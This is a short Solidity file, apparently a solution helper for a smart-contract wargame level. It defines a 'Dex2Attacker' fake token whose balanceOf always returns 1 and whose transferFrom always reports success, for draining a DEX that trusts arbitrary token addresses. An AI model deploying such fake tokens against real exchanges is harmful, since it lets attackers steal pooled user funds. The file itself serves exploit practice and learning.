// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Dex2Attacker {
    function balanceOf(address) public view returns (uint256) {
        return 1;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        return true;
    }
}
